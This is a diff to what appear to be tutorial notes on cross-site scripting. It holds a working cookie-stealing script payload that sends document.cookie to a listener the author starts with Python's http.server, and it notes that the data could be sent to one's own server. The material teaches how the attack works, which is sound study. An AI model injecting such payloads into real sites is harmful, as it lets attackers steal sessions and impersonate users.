@@ -20,12 +20,11 @@ I'm <strong>STRONG</strong>!
 - What can we do with XSS?
 - We can get user cookies, redirect them to a site we can control, or even impersonate the user and execute actions as them.
 - Since this is local we can use python's built in http server to get a callback.
-
-- **TODO** look up free http log service
+- `python -m http.server`
 - If you have your own server, you can easily send the data to that as well.
 - To get our callback we can enter into either of the forms with:
 ```html
-<script>document.write('<img src="http://localhost:8080/?cookie=' + document.cookie + '" />')</script>
+<script>document.write('<img src="http://localhost:8000/?cookie=' + document.cookie + '" />')</script>
 ```
 
 - In this case we're 'hacking' ourself, but if this was posted to a vulnerable form page, a malicious user could make everyone who visited the page like their profile or post.
